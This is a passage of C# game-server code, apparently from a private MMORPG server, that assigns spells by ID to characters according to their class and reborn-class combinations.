                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1280 });//WaterElf
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1050 });//XPRevive
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1055 });//HealingRain 
                        client.AddSpell(new Spell(true) { ID = 1175 });//AdvancedCure
                        client.AddSpell(new Spell(true) { ID = 1280 });//WaterElf
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1280 });//WaterElf
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 3090 });//Pervade
                    }
                    else if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10010 });//Poison
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    }
                    else if (client.Entity.Class == 71)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    }
                    else if (client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    }
                }
                #endregion
                #region Arch-Nin
                if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 55)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//ToxicFog
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 6001 });//ToxicFog
                    }
                    else if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 6000 });//TwofoldBlades
                        client.AddSpell(new Spell(true) { ID = 6001 });//ToxicFog
                        client.AddSpell(new Spell(true) { ID = 6002 });//PoisonStar
                        client.AddSpell(new Spell(true) { ID = 6004 });//ArcherBane
                        client.AddSpell(new Spell(true) { ID = 6011 });//FatalStrike
                        client.AddSpell(new Spell(true) { ID = 6010 });//ShurikenVortex
                    }
                }
                #endregion
                #region Arch-Monk
                if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 65)
                {

                    if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure

                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 41 || client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                }
                #endregion
                #region Arch-Pirate
                if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 75)
                {

                    if (client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                }
                #endregion
                #region Arch-Brucelee
                if (client.Entity.FirstRebornClass == 45 && client.Entity.SecondRebornClass == 85)
                {

                    if (client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                }
                #endregion
                #endregion
                #region Trojan2
                #region Tro-Arch
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 45)
                {
                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 5000 });//Freezing Frankos
                    }
                    else if (client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                    }
                    else
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                }

                #endregion
                #region Tro-Fire
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 145)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3080 });//Dodge
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1120 });//FireCircle
                    }
                }
                #endregion
                #region Tro-Tro
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 15)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 3050 });//CruelShade

                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 3050 });//CruelShade
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3050 });//Cruel Shade
                        client.AddSpell(new Spell(true) { ID = 10315 });//DragonWhirl
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3050 });//Cruel Shade
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 5100 });//Iron Shirt

                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3050 });//Cruel Shade
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1190 });//Spirit Healing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                    }
                }


                #endregion
                #region Tro-War
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 25)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 5100 });//IronShirt
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1020 });//ShieldShield
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 5100 });//IronShirt
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                        client.AddSpell(new Spell(true) { ID = 1320 });//FlyingMoon
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 5100 });//IronShirt
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1020 });//ShieldShield
                        client.AddSpell(new Spell(true) { ID = 1025 });//SuperMan
                    }
                }
                #endregion
                #region Tro-Water
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 135)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility

                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1050 });//XPRevive
                        client.AddSpell(new Spell(true) { ID = 1175 });//AdvancedCure
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                    }
                    else if (client.Entity.Class == 21 || client.Entity.Class == 51 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 3090 });//Pervade
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                }
                #endregion
                #region Tro-Nin
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 55)
                {

                    if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 6000 });//TwofoldBlades
                        client.AddSpell(new Spell(true) { ID = 6001 });//ToxicFog
                        client.AddSpell(new Spell(true) { ID = 6002 });//PoisonStar
                        client.AddSpell(new Spell(true) { ID = 6004 });//ArcherBane
                        client.AddSpell(new Spell(true) { ID = 6011 });//FatalStrike
                        client.AddSpell(new Spell(true) { ID = 6010 });//ShurikenVortex
                    }
                    else
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 6001 });//ToxicFog
                    }
                }
                #endregion
                #region Tro-Monk
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 65)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                    client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                    client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                    client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                }
                #endregion
                #region Tro-Pirate
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 75)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                    client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                    client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                }
                #endregion
                #region Tro-Brucelee
                if (client.Entity.FirstRebornClass == 15 && client.Entity.SecondRebornClass == 85)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                    client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                    client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                }
                #endregion
                #endregion
                #region Ninja2
                #region Nin-Arch
                if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 45)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 5000 });//Freezing Franko
                    }
                    else if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 142 || client.Entity.Class == 132 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    }
                }
                #endregion
                #region Nin-Fire
                {

                    if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 145)
                    {

                        if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                        {
                            client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                            client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                            client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                            client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                            client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                            client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        }
                        else if (client.Entity.Class == 142)
                        {
                            client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                            client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                            client.AddSpell(new Spell(true) { ID = 3080 });//Dodge
                            client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        }
                        else if (client.Entity.Class == 132)
                        {
                            client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                            client.AddSpell(new Spell(true) { ID = 1120 });//FireCircle
                            client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        }
                    }
                }
                #endregion
                #region Nin-Tro
                if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 15)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 5100 });//IronShirt
                    }

                }
                #endregion
                #region Nin-War
                if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 25)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1320 });//FlyingMoon
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect

                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 1020 });//ShieldShield
                        client.AddSpell(new Spell(true) { ID = 1025 });//SuperMan
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                    }
                }
                #endregion
                #region Nin-Water
                if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 135)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 1050 });//XPRevive
                        client.AddSpell(new Spell(true) { ID = 1175 });//AdvancedCure
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1055 });//HealingRain
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                        client.AddSpell(new Spell(true) { ID = 3090 });//Pervade
                    }
                }
                #endregion
                #region Nin-Nin
                if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 55)
                {

                    if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6000 });//
                        client.AddSpell(new Spell(true) { ID = 6001 });//
                        client.AddSpell(new Spell(true) { ID = 6002 });//
                        client.AddSpell(new Spell(true) { ID = 6003 });//
                        client.AddSpell(new Spell(true) { ID = 6004 });//
                        client.AddSpell(new Spell(true) { ID = 6010 });//
                        client.AddSpell(new Spell(true) { ID = 6011 });//
                    }
                    else
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                    }
                }
                #endregion
                #region Nin-Monk
                if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 65)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    client.AddSpell(new Spell(true) { ID = 6001 });//ToxicFog
                }
                #endregion
                #region Nin-Pirate
                if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 75)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    client.AddSpell(new Spell(true) { ID = 6001 });//ToxicFog
                }
                #endregion
                #region Nin-Brucelee
                if (client.Entity.FirstRebornClass == 55 && client.Entity.SecondRebornClass == 85)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 6001 });//ToxicFog
                }
                #endregion
                #endregion
                #region Fire2
                #region Fire-Arch
                if (client.Entity.FirstRebornClass == 145 && client.Entity.SecondRebornClass == 45)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                    client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                    client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                    client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    client.AddSpell(new Spell(true) { ID = 5002 });//PoisonousFrankos
                }
                #endregion
                #region Fire-Fire
